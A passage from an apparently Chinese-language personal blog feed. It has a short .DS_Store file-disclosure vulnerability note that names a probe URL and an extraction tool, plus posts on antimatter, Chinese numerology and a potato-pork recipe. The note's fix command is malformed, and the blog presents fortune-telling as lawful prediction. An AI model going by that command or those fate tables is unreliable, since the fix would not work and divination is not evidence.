        <content type="html"><![CDATA[<h2 id="I"><a href="#I" class="headerlink" title="I"></a>I</h2><blockquote><p>这是IRF系列的第一篇。何为IRF，IRF是Enomothem于2023年1月31日提出的漏洞管理信息方法，IRF分别为Information、Recurrence和Fix plan</p><p>I: 漏洞的基本信息、物体Object（什么应用）、时间Time（可选）、空间Space（版本范围，受影响范围）、编号（CVE等等）</p><p>R: 漏洞复现方法、具备的条件</p><p>F: 漏洞修复计划。</p></blockquote><p><strong>基本信息</strong></p><p>Ds_Store文件泄露漏洞。.<em>DS_Store</em> 是 Desktop Services Store 的缩写，是 macOS 操作系统上的一个不可见文件，只要您使用“Finder”查看文件夹，它就会自动创建。如果您是开发人员或系统管理员，并且在将文件从计算机传输到服务器，或者在自动部署过程中没有采取必要的预防措施，那么您可能会将这些文件放在您的站点或应用程序无意识地存在的服务器上。此文件存储其包含文件夹的自定义属性/元数据以及它周围的其他文件的名称。暴露这些信息可能会让黑客做出恶意行为并让他们看到私人文件。</p><p><strong>OTS</strong></p><ul><li>Mac Operator System</li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><p><strong>分析</strong></p><p><a href="http://example.com/.DS_Store">http://example.com/.DS_Store</a></p><p><strong>复现</strong></p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230303203916138.png"></p><p>工具下载：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><p>1.关闭生成该文件</p><p>终端输入命令：com.apple.desktopservices DSDontWriteNetworkStores false</p><p>2.寻找并删除该类型文件</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IRF </tag>
            
            <tag> 文件泄露 </tag>
            
            <tag> Ds_Store </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理学基础 | 反物质</title>
      <link href="posts/7953.html"/>
      <url>posts/7953.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我是很喜欢物理学的，从初中接触起，可能与我小时候喜欢发明各种小发明有关，最喜欢的物理学家是霍金，霍金在我去考科目三时的路上得知去世，可惜了，如今这个世界上向爱因斯坦、牛顿、特斯拉、麦克斯韦、玻尔、卡文迪许、伽利略·伽利雷、<strong>狄拉克</strong>、马克斯·普朗克等著名的物理学家已经不多了。他们奠定了物理学大厦的基础，力图搭建物理学大一统，从经典物理学和量子力学，爱因斯坦的相对论弥补了牛顿公式的缺陷、、热力电磁。。。</p><p>不知是因为什么，我高中毕业之后，就很少碰物理学了，可能是因为学了计算机，可能是因为忘记了曾经的热爱，所以我决定将物理学重新热爱起来，把学习的笔记写在博客上。</p><p>反物质是我初中在《天使与魔鬼》一书中接触到的，后来，我发现高中的物理书上也未曾提到此物，我也向物理老师证实了，却有此事，后来我在百度上查了一些资料，才知道这是一个很神秘、很强大的物质。</p><p>需要理解世界，就需要从最基本的组成开始，物质的分子、原子。</p><h2 id="反物质"><a href="#反物质" class="headerlink" title="反物质"></a>反物质</h2><p>最早提出反物质概念的是英国物理学家狄拉克。</p><p><strong>保罗·阿德里安·莫里斯·狄拉克</strong>（Paul Adrien Maurice Dirac，1902年8月8日－1984年10月20日），男，英国理论物理学家，量子力学的奠基者之一，并对量子电动力学早期的发展作出重要贡献。曾经主持剑桥大学的卢卡斯数学教授席位，并在佛罗里达州立大学度过他人生的最后十四个年头。<br>他给出的狄拉克方程可以描述费米子的物理行为，并且预测了反物质的存在。<br>1933年，因为“发现了在原子理论里很有用的新形式”（即量子力学的基本方程——薛定谔方程和狄拉克方程），狄拉克和埃尔温·薛定谔共同获得了诺贝尔物理学奖。</p><p>赵忠尧第一次发现了正电子的存在，他是人类物理学史上第一个发现反物质的科学家。他观测到的正、负电子湮灭辐射比后来安德逊看到的正电子径迹早两年。赵忠尧的研究成果为研制正负电子对撞机提供了理论基础，同时也奠定了他在世界物理学界的地位。</p><p><strong>赵忠尧</strong>（1902年6月27日—1998年5月28日），浙江诸暨人，物理学家，中国核物理研究和加速器建造事业的开拓者。曾任中国科学院高能物理研究所研究员、副所长，中国科学院原子能研究所副所长，中国科学技术大学教授、物理系主任，中国核学会名誉理事长。历任中国科学院物理研究所副所长。四、五、六届全国人民代表大会常务委员会委员。</p><h4 id="反物质-1"><a href="#反物质-1" class="headerlink" title="反物质"></a>反物质</h4><p>定义：反物质是正常物质的反状态。当正反物质相遇时，双方就会相互湮灭抵消，发生爆炸并产生巨大能量。</p><p>是否存在反物质</p><p>2010年11月17日，有媒体说，人类首次捕获到反物质，500克能量可超过氢弹。欧洲科学家成功制造出多个反氢原子，并使其存在了0.17秒，这是物理学界的突破性发现，也是人类首次捕获到反物质。500克反物质的破坏力可以超过世界上最大的氢弹。</p><p><strong>“抓住”反物质达千秒</strong></p><p>欧洲核子研究中心的科研人员在2011年6月5日在英国《自然·物理》杂志上报告说，他们成功地将反氢原子“抓住”长达一千秒的时间，也就是超过16分钟，这有利于对反物质性质进行精确研究。反氢原子是普通氢原子对应的反物质形态。反物质与普通物质相遇就会湮灭，此前制造出的反氢原子往往只能存在几微秒的时间。</p><p>反物质的应用目前仍然仅存在于小说，电影中，如武器，激光束，行星炸弹，飞船的燃料等尖端的科技。</p><p>据科学家测算，用世界上最大的欧洲大型强子对撞机，不间断运行1000年，才能够对撞出1ug（微克）反物质，也就是百万分之一克。这个能量有多大呢？1ug的反物质与1ug的正物质湮灭，可释放出2ug质量的能量，根据爱因斯坦质能方程计算，可得到1.8*10^8J能量，相当50度电能，或43kgTNT炸药爆炸能量。</p><p>我认为，我们只是无法让反物质保留足够长的时间，随着技术水平的提高，谁掌握了这项技术就掌握了最强大的能量的运用。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 物理学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反物质 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数术-基础</title>
      <link href="posts/ab2b.html"/>
      <url>posts/ab2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="数术"><a href="#数术" class="headerlink" title="数术"></a>数术</h2><p>古人将自然界所观察到的各种变化，与人事、政治、社会的变化结合起来，认为两者有某种内在关系，这种关系可用术数来归纳、推理。于是，术数便用来推测个人，甚至国家的命运吉凶。</p><p>基本四个概念</p><p>1、盘概念：大六壬，奇门遁甲，太乙式，紫微斗数。<br>2、卦概念：六爻法，梅花易数。<br>3、干支概念：四柱推命，河洛数理，风水术，铁板神数，演禽法。<br>4、形式概念：面相、手相、骨相、字相、风水术。</p><p>这四种概念中，除了形法外，其他三种都与干支密切关连。中国古代预测方法中，其核心为六个字：阴阳、五行、干支。阴阳是吉凶的依据，五行既是阴阳的具体状态、又是作用变化，干支是阴阳五行结合的具体表示，是方位、时空与周期，其既是阴阳、五行的具体细致表示而其本身又含有丰富的象的内容，所以内容最丰富，也是占的具体演算内容，也最神秘。干支数为一个整体，加上纳音、阴阳之分，时差旺衰之象，干支成了高信息含量的数理模型。</p><h2 id="阴阳五行"><a href="#阴阳五行" class="headerlink" title="阴阳五行"></a>阴阳五行</h2><p>阴阳</p><p>阴阳依存是一个动态的过程，这一动态过程伴随事物终身，决定事物发展的进程。</p><p>阴阳可以互相转化，同时二者又是相互依存的。</p><p>阴阳是古人对宇宙万物两种相反相成的性质的一种抽象，是宇宙的对立统一，也是思维法则的哲学范畴。</p><p>《易经》便是讲”阴阳”变化的数理和哲理。</p><p>五行</p><p>五行学说也是我国古代人民创造的一种哲学思想。</p><p>它以日常生活的五种物质：金、木、水、火、土元素，作为构成宇宙万物及各种自然现象变化的基础。五行说把自然界一切事物的性质纳入这五大类的范畴。</p><p>相生相克：</p><p>水生木，木生火，火生土，土生金，金生水。<br>水克火，火克金，金克木，木克土，土克水。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230301125020995.png"></p><h2 id="天干地支"><a href="#天干地支" class="headerlink" title="天干地支"></a>天干地支</h2><p><strong>天干</strong></p><p>甲（jiǎ）、乙（yǐ）、丙（bǐng）、丁（dīng）、戊（wù）、己（jǐ）、庚（gēng）、辛（xīn）、壬（rén）、癸（guǐ）；</p><p>阳干：甲、丙、戊、庚、壬<br>阴干：乙、丁、己、辛、癸</p><p><strong>地支</strong></p><p>子（zǐ）、丑（chǒu）、寅（yín）、卯（mǎo）、辰（chén）、巳（sì）、午（wǔ）、未（wèi）、申（shēn）、酉（yǒu）、戌（xū）、亥（hài）</p><p>阳支：子、寅、辰、午、申、戌</p><p>阴支：丑、卯、巳、未、酉、亥</p><p><strong>地支与生肖</strong></p><p>子-鼠，丑-牛，寅-虎，卯-兔，辰-龙，巳-蛇， 午-马，未-羊，申-猴，酉-鸡，戌-狗，亥-猪。</p><p><strong>天干地支与五行</strong></p><p><strong>天干：</strong>甲-木、乙-木、丙-火、丁-火、戊-土、己-土、庚-金、辛-金、壬-水、癸-水</p><p><strong>地支：</strong>子-水、丑-土、寅-木、卯-木、辰-土、巳-火、午-火、未-土、申-金、酉-金、戌-土、亥-水</p><p><strong>组合 | 六十甲子</strong></p><p>规律为——阳干配阳支，阴干配阴支，中国古代计时历法</p><table><thead><tr><th></th><th>甲</th><th>乙</th><th>丙</th><th>丁</th><th>戊</th><th>己</th><th>庚</th><th>辛</th><th>壬</th><th>癸</th></tr></thead><tbody><tr><td>子</td><td>甲子</td><td>-</td><td>丙子</td><td>-</td><td>戊子</td><td>-</td><td>庚子</td><td>-</td><td>壬子</td><td>-</td></tr><tr><td>丑</td><td>-</td><td>乙丑</td><td>-</td><td>丁丑</td><td>-</td><td>己丑</td><td>-</td><td>辛丑</td><td>-</td><td>癸丑</td></tr><tr><td>寅</td><td>甲寅</td><td>-</td><td>丙寅</td><td>-</td><td>戊寅</td><td>-</td><td>庚寅</td><td>-</td><td>壬寅</td><td>-</td></tr><tr><td>卯</td><td>-</td><td>乙卯</td><td>-</td><td>丁卯</td><td>-</td><td>己卯</td><td>-</td><td>辛卯</td><td>-</td><td>癸卯</td></tr><tr><td>辰</td><td>甲辰</td><td>-</td><td>丙辰</td><td>-</td><td>戊辰</td><td>-</td><td>庚辰</td><td>-</td><td>壬辰</td><td>-</td></tr><tr><td>巳</td><td>-</td><td>乙巳</td><td>-</td><td>丁巳</td><td>-</td><td>己巳</td><td>-</td><td>辛巳</td><td>-</td><td>癸巳</td></tr><tr><td>午</td><td>甲午</td><td>-</td><td>丙午</td><td>-</td><td>戊午</td><td>-</td><td>庚午</td><td>-</td><td>壬午</td><td>-</td></tr><tr><td>未</td><td>-</td><td>乙未</td><td>-</td><td>丁未</td><td>-</td><td>己未</td><td>-</td><td>辛未</td><td>-</td><td>癸未</td></tr><tr><td>申</td><td>甲申</td><td>-</td><td>丙申</td><td>-</td><td>戊申</td><td>-</td><td>庚申</td><td>-</td><td>壬申</td><td>-</td></tr><tr><td>酉</td><td>-</td><td>乙酉</td><td>-</td><td>丁酉</td><td>-</td><td>己酉</td><td>-</td><td>辛酉</td><td>-</td><td>癸酉</td></tr><tr><td>戌</td><td>甲戌</td><td>-</td><td>丙戌</td><td>-</td><td>戊戌</td><td>-</td><td>庚戌</td><td>-</td><td>壬戌</td><td>-</td></tr><tr><td>亥</td><td>-</td><td>乙亥</td><td>-</td><td>丁亥</td><td>-</td><td>己亥</td><td>-</td><td>辛亥</td><td>-</td><td>癸亥</td></tr></tbody></table><p><strong>时间</strong></p><table><thead><tr><th>年天干</th><th>正月</th><th>二月</th><th>三月</th><th>四月</th><th>五月</th><th>六月</th><th>七月</th><th>八月</th><th>九月</th><th>十月</th><th>十一月</th><th>十二月</th></tr></thead><tbody><tr><td>甲、己</td><td>丙寅</td><td>丁卯</td><td>戊辰</td><td>己巳</td><td>庚午</td><td>辛未</td><td>壬申</td><td>癸酉</td><td>甲戌</td><td>乙亥</td><td>丙子</td><td>丁丑</td></tr><tr><td>乙、庚</td><td>戊寅</td><td>己卯</td><td>庚辰</td><td>辛巳</td><td>壬午</td><td>癸未</td><td>甲申</td><td>乙酉</td><td>丙戌</td><td>丁亥</td><td>戊子</td><td>己丑</td></tr><tr><td>丙、辛</td><td>庚寅</td><td>辛卯</td><td>壬辰</td><td>癸巳</td><td>甲午</td><td>乙未</td><td>丙申</td><td>丁酉</td><td>戊戌</td><td>己亥</td><td>庚子</td><td>辛丑</td></tr><tr><td>丁、壬</td><td>壬寅</td><td>癸卯</td><td>甲辰</td><td>乙巳</td><td>丙午</td><td>丁未</td><td>戊申</td><td>己酉</td><td>庚戌</td><td>辛亥</td><td>壬子</td><td>癸丑</td></tr><tr><td>戊、癸</td><td>甲寅</td><td>乙卯</td><td>丙辰</td><td>丁巳</td><td>戊午</td><td>己未</td><td>庚申</td><td>辛酉</td><td>壬戌</td><td>癸亥</td><td>甲子</td><td>乙丑</td></tr></tbody></table><p><strong>纪月节气表</strong></p><table><thead><tr><th>地支</th><th>节气时间段</th><th>中气</th><th>近似农历月份</th><th>近似阳历月份</th><th>甲或己年</th><th>乙或庚年</th><th>丙或辛年</th><th>丁或壬年</th><th>戊或癸年</th></tr></thead><tbody><tr><td>寅月</td><td>立春-惊蛰</td><td>雨水</td><td>正月</td><td>2月</td><td>丙寅月</td><td>戊寅月</td><td>庚寅月</td><td>壬寅月</td><td>甲寅月</td></tr><tr><td>卯月</td><td>惊蛰-清明</td><td>春分</td><td>二月</td><td>3月</td><td>丁卯月</td><td>己卯月</td><td>辛卯月</td><td>癸卯月</td><td>乙卯月</td></tr><tr><td>辰月</td><td>清明-立夏</td><td>谷雨</td><td>三月</td><td>4月</td><td>戊辰月</td><td>庚辰月</td><td>壬辰月</td><td>甲辰月</td><td>丙辰月</td></tr><tr><td>巳月</td><td>立夏-芒种</td><td>小满</td><td>四月</td><td>5月</td><td>己巳月</td><td>辛巳月</td><td>癸巳月</td><td>乙巳月</td><td>丁巳月</td></tr><tr><td>午月</td><td>芒种-小暑</td><td>夏至</td><td>五月</td><td>6月</td><td>庚午月</td><td>壬午月</td><td>甲午月</td><td>丙午月</td><td>戊午月</td></tr><tr><td>未月</td><td>小暑-立秋</td><td>大暑</td><td>六月</td><td>7月</td><td>辛未月</td><td>癸未月</td><td>乙未月</td><td>丁未月</td><td>己未月</td></tr><tr><td>申月</td><td>立秋-白露</td><td>处暑</td><td>七月</td><td>8月</td><td>壬申月</td><td>甲申月</td><td>丙申月</td><td>戊申月</td><td>庚申月</td></tr><tr><td>酉月</td><td>白露-寒露</td><td>秋分</td><td>八月</td><td>9月</td><td>癸酉月</td><td>乙酉月</td><td>丁酉月</td><td>己酉月</td><td>辛酉月</td></tr><tr><td>戌月</td><td>寒露-立冬</td><td>霜降</td><td>九月</td><td>10月</td><td>甲戌月</td><td>丙戌月</td><td>戊戌月</td><td>庚戌月</td><td>壬戌月</td></tr><tr><td>亥月</td><td>立冬-大雪</td><td>小雪</td><td>十月</td><td>11月</td><td>乙亥月</td><td>丁亥月</td><td>己亥月</td><td>辛亥月</td><td>癸亥月</td></tr><tr><td>子月</td><td>大雪-小寒</td><td>冬至</td><td>十一月</td><td>12月</td><td>丙子月</td><td>戊子月</td><td>庚子月</td><td>壬子月</td><td>甲子月</td></tr><tr><td>丑月</td><td>小寒-立春</td><td>大寒</td><td>十二月</td><td>1月</td><td>丁丑月</td><td>己丑月</td><td>辛丑月</td><td>癸丑月</td><td>乙丑月</td></tr></tbody></table><p><strong>时辰</strong></p><table><thead><tr><th><strong>时辰地支</strong></th><th><strong>北京时间</strong></th><th><strong>甲或己日</strong></th><th><strong>乙或庚日</strong></th><th><strong>丙或辛日</strong></th><th><strong>丁或壬日</strong></th><th><strong>戊或癸日</strong></th></tr></thead><tbody><tr><td>子时</td><td>23时—1时</td><td>甲子时</td><td>丙子时</td><td>戊子时</td><td>庚子时</td><td>壬子时</td></tr><tr><td>丑时</td><td>1时—3时</td><td>乙丑时</td><td>丁丑时</td><td>己丑时</td><td>辛丑时</td><td>癸丑时</td></tr><tr><td>寅时</td><td>3时—5时</td><td>丙寅时</td><td>戊寅时</td><td>庚寅时</td><td>壬寅时</td><td>甲寅时</td></tr><tr><td>卯时</td><td>5时—7时</td><td>丁卯时</td><td>己卯时</td><td>辛卯时</td><td>癸卯时</td><td>乙卯时</td></tr><tr><td>辰时</td><td>7时—9时</td><td>戊辰时</td><td>庚辰时</td><td>壬辰时</td><td>甲辰时</td><td>丙辰时</td></tr><tr><td>巳时</td><td>9时—11时</td><td>己巳时</td><td>辛巳时</td><td>癸巳时</td><td>乙巳时</td><td>丁巳时</td></tr><tr><td>午时</td><td>11时—13时</td><td>庚午时</td><td>壬午时</td><td>甲午时</td><td>丙午时</td><td>戊午时</td></tr><tr><td>未时</td><td>13时—15时</td><td>辛未时</td><td>癸未时</td><td>乙未时</td><td>丁未时</td><td>己未时</td></tr><tr><td>申时</td><td>15时—17时</td><td>壬申时</td><td>甲申时</td><td>丙申时</td><td>戊申时</td><td>庚申时</td></tr><tr><td>酉时</td><td>17时—19时</td><td>癸酉时</td><td>乙酉时</td><td>丁酉时</td><td>己酉时</td><td>辛酉时</td></tr><tr><td>戌时</td><td>19时—21时</td><td>甲戌时</td><td>丙戌时</td><td>戊戌时</td><td>庚戌时</td><td>壬戌时</td></tr><tr><td>亥时</td><td>21时—23时</td><td>乙亥时</td><td>丁亥时</td><td>己亥时</td><td>辛亥时</td><td>癸亥时</td></tr></tbody></table><p><strong>干支本义解 | 象法</strong></p><p>干者犹树之干也。</p><p>甲：像草木破土而萌，阳在内而被阴包裹。</p><p>乙：草木初生，枝叶柔软屈曲。</p><p>丙：炳也,如赫赫太阳，炎炎火光，万物皆炳燃着，见而光明。</p><p>丁：草木成长壮实，好比人的成丁。</p><p>戊：茂盛也，象征大地草木茂盛繁荣。</p><p>己：起也，纪也，万物抑屈而起，有形可纪。</p><p>庚：更也，秋收而待来春。</p><p>辛：金味辛，物成而后有味，辛者，新也，万物肃然更改，秀实新成。</p><p>壬：妊也，阳气潜伏地中，万物怀妊。</p><p>癸：揆也，万物闭藏，怀妊地下，揆然萌芽。</p><p>支者犹树之枝也。</p><p>子：孳也，阳气始萌，孳生于下也。</p><p>丑：纽也，寒气自屈曲也。</p><p>寅：髌也，阳气欲出，阳尚强而髌演于下。</p><p>卯：冒也，万物冒地而出。</p><p>辰：伸也，万物舒伸而出。</p><p>巳：巳也，阳气毕布已矣。</p><p>午：仵也，阴阳交相愕而仵。</p><p>未：眛也，日中则昃，阳向幽也。</p><p>申：伸束以成，万物之体皆成也。</p><p>酉：就也，万物成熟。</p><p>戌：灭也，万物灭尽。</p><p>亥：核也，万物收藏，皆坚核也。</p><h2 id="周易三命汇通"><a href="#周易三命汇通" class="headerlink" title="周易三命汇通"></a>周易三命汇通</h2><p>每个人有八个字，年、月、日、时</p><p>甲子年生海中金命，乙丑年生海中金命<br>丙寅年生炉中火命，丁卯年生炉中火命<br>戊辰年生大林木命，己巳年生大林木命<br>庚午年生路旁土命，辛未年生路旁土命<br>壬申年生剑锋金命，癸酉年生剑锋金命<br>甲戌年生山头火命，乙亥年生山头火命<br>丙子年生涧下水命，丁丑年生涧下水命<br>戊寅年生城头土命，己卯年生城头土命<br>庚辰年生白蜡金命，辛巳年生白蜡金命<br>壬午年生杨柳木命，癸未年生杨柳木命<br>甲申年生泉中水命，乙酉年生泉中水命<br>丙戌年生屋上土命，丁亥年生屋上土命<br>戊子年生霹雳火命，己丑年生霹雳火命<br>庚寅年生松柏木命，辛卯年生松柏木命<br>壬辰年生长流水命，癸巳年生长流水命<br>甲午年生沙中金命，乙未年生沙中金命<br>丙申年生山下火命，丁酉年生山下火命<br>戊戌年生平地木命，己亥年生平地木命<br>庚子年生壁上土命，辛丑年生壁上土命<br>壬寅年生金箔金命，癸卯年生金箔金命<br>甲辰年生覆灯火命，乙巳年生覆灯火命<br>丙午年生天河水命，丁未年生天河水命<br>戊申年生大驿土命，己酉年生大驿土命<br>庚戌年生钗钏金命，辛亥年生钗钏金命<br>壬子年生桑柘木命，癸丑年生桑柘木命<br>甲寅年生大溪水命，乙卯年生大溪水命<br>丙辰年生沙中土命，丁巳年生沙中土命<br>戊午年生天上火命，己未年生天上火命<br>庚申年生石榴木命，辛酉年生石榴木命<br>壬戌年生大海水命，癸亥年生大海水命</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 数术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阴阳五行 </tag>
            
            <tag> 天干地支 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0226土豆炒肉</title>
      <link href="posts/2add.html"/>
      <url>posts/2add.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0226 土豆炒肉</p><p>等级：高赞</p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>今天买的新键盘到了，感觉码字都流畅了。罗技的K380，上个星期体验了一下月影的，感觉还不错，就买下来了。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230227001049337.png"></p><p>今天继续接着上次谈到的<a href="https://enomothem.com/posts/24bf.html#toc-heading-6">变量</a>来思考一下人生。上次通过变量，把变量看作是时间的体现，世间万物的变化，即为时间。什么是宇宙，在《尸子》中提到：“上下四方曰宇，往古来今曰宙。“ 也就是说，宇宙是由三维的空间，哪三维，长宽高，和一维的时间构成，所以我们的世界是四维的，为什么说是我们的世界呢，因为还有更高的维度，我们无法触碰，在高纬度面前我们就如同蚂蚁一般。或许其它文明存在于更高的维度吧。比如我们知道时间只有一维，而且时间是单向的，不可逆的，那么你可以想象，如果给你一个选择，在大学毕业的那一刻，你选择了当厨师，而不是搞安全，那么你现在应该在某个五星级餐厅当厨师也说不定是吧，但事实我们都知道选择了的事情，后悔也没有用，自己选择的路，那没办法，就算你现在重新改变你的职业，也无法改变几年前你选择了现在这条路的历史。之所以说我们无法改变，是因为时间不可逆，然后再一个就是，我们只能选择一条路，所以时间是一维的。</p><p>当然，我们也可以想一下高纬度的世界，我曾经用一张图推理出从四维到11维度，凭空想象的话，很抽象，很复杂，脑子承受不住，以后有机会的话，我会用文字描述出来。好，我们就只说说时间的二维，时间的二维就像一个树枝的分支，由一个点（指空间三维）分支成两条线，这时候，空间就像被复制了一份同时存在了两份，时间是同步的，所以时间变成了二维，两个时间从分支的那一刻起发生了不一样的走向，比如一个空间（宇宙）的你（物质）选择了当厨师，而另一个空间的你选择了搞安全，空间（三维）+时间（二维），这就是五维。然后六维是什么，你可以想象一下，空间的三维有三个坐标，时间同样可以这样理解，时间一维是我们基本的单向的时间线，而二维时间就是我们说的纵坐标，时间的分支，同一时刻，可能存在无数个分支，你可能是贫民窟里的流浪汉，又或者是科研所的研究人员都说不定。总结五维就是在时间一维中的任意点有无数个空间。至少五维有一个选择的过程，而你还是你，而六维，是改变整个一维时间，从我们理解的宇宙大爆炸算起的时间初始到宇宙坍缩直至毁灭的我们这个身处的宇宙的一维时间线，可以有无数个分支，这是真正意义上的无数个单独的时间，从开始到结束有无数个，你能想象吗，也就是你可以是你，也可以不是你，你可以是男的，你也可以是女的，因为这条线是从宇宙大爆炸起始，无数种可能，意味着现在的你，可以改变自己的出身，可以是灭霸，可以是任何角色，甚至你可以是物质，比如沙滩上的一粒沙子，虽然人也是物质，我们不都是宇宙中的一滴尘埃吗，只不过我们是不一样的，为什么不一样，我用一句话总结。</p><blockquote><p>在我们理解的维度里，任何物质都不像我们一样。人的定义是什么，会思考，有情绪，会制造和使用工具的高级动物。</p></blockquote><p>以至于在我们理解和生活的四维空间里，我们人类就好像是这个世界的奇迹，独一无二，其实只不过是因为我们维度限制了我们的想象力，不过想一想确实挺神奇的，一个偌大的宇宙，我们只知道只有我们人类文明，这是我们的幸运。因为这在六维空间中，这样的可能性可能是很小很小，但六维的可能性是无穷大的，正因为如此，我们有幸，成为了那一条时间线上的某个分支上的空间。因为可能有的时间线甚至没有宇宙大爆炸，也就没有这个宇宙的恒星行星，也没有银河系中的太阳系的蓝色星球，以及我们。</p><p>维度越高，我们越无法想象。所以我们回到正题，我们人生的意义。我们从哪里来，我们要到哪里去。从小到大，没有人会问你，也没有人会教你，我们接受的是九年义务教育，课本上教的是四维空间，教我们的是古诗词，数学，物理，化学，历史，地理等等一些理论，但从来不会告诉你我们是谁，我们的意义。</p><p>也许你会说，不是啊，老师说过以后要为社会做贡献，我们是螺丝钉，但这是对于社会而言，对于你个人呢。</p><p>这里先谈一谈玄学问题。为什么我们相信算命，为什么哪些古人的方法那么的准，你知道为什么吗，这并不是什么迷信，也不是什么玄学（玄学指我们无法理解所以感觉很无解的事情，也就是说超出了我们四维的想象了），其实古人的算命，就是通过世间万物的规律，变化，记录了一些算法，比如一个人所处的环境，结合千百年来的规律，这个人在什么环境下，什么节点会有哪些结果，这个是复杂的，但存在规律，所以古人记录了下来，我们现代科学发展特别快，但有多少年，不过才几百年，其实也是对宇宙的规律进行的总结，只不过我们现在更加系统的，先进的观察仪器。但是人类的历史很长，古人将这些规律记录了下来，然后通过询问八字等得知你的属性，五行相克嘛，看起来很简单，其实宇宙的本质就是物质中的相互作用，这样一来，就相对于对你进行了一个推演，从出身的那一刻就算到了你生命的结束，这是通过计算出来的，是大量的论证规律得出的，不是那么简简单单的，所以知道了这个你就不会觉得奇怪了。四维生物，我们只能通过发现规律，才能更好的生存下去，即便如此，高维文明可以不费吹灰之力毁灭我们，但我们作为人类，我们就算知道无法与之一战，也同样会拿起我们最先进的武器，用我们文明唯一智慧的东西，脑袋，去发明更加高级的武器与之一站。</p><p>我觉得<a href="https://enomothem.com/posts/3fc8.html">易经</a>就说的很有道理，对人生的思考很有参考意义。</p><p>所以我们人的意义是什么，我认为作为人类，我们可以享有人的一切，可以思考，可以吃美食，可以玩，可以实现梦想，可以做任何自己想做的事情，活着的每一刻都是存在的意义。一切变数，都是你一生中的一部分，这就是意义，不管是过程，还是结果，你的存在就是意义，这就如同每一粒沙子存在于沙滩，每一片雪花存在于雪山一样。</p><p>所以说到底，一切皆变数，时间会给我们答案，这就是我们谈变量的意义所在。</p><p>【新话题】从宇宙大爆炸开始，从无到有，一个字，【变】量，变导致了稳定态被打破，不可避免的事情是热力学第二定律（principle of entropy increase，熵增定律），分子的运动，开始杂乱，房间的衣服，开始乱丢，书籍杂乱丢在各个角落。思路开始杂乱，没有目标，没有结构，丢了魂，一切乱成了一锅粥。</p><p>所以从2021年开始，我开始了熵减，使任何事情，任何物品有了安排，有了规划，有了目标，有了定位，有了整齐，无任何多余的无意义的，但根据熵增定律，熵减是需要付出代价的。整理杂乱无章的物品就需要做功，消耗能量，就如同让热冷却下来，需要消耗能量，让温度变低，使分子趋于稳定。就如燥热的天气开启了空调，使躁动不安的你安定了下来，为此空调付出了代价，消耗了电能驱动电机使冷空气作用于你的房间。</p><p>人嘛，折腾才是常态，吃饭不洗碗那你下次就无法继续做饭，电脑坏了你不修好就无法工作，所以正因为我们懒下来房间就容易乱，熵增就是这个道理，任由乱的趋势发展而不去维护，那就会失控。所以得行动起来，支棱起来，不要躺平太久，忘记了站立。</p><p>，</p><blockquote><p>一个逗号，什么意思，未完待续，人生永远没有止境 -</p></blockquote><pre class=" language-rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Rust还得学啊，不让基础都忘光了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>最主要的肉肉（pork）、马铃薯（Solanum tuberosum 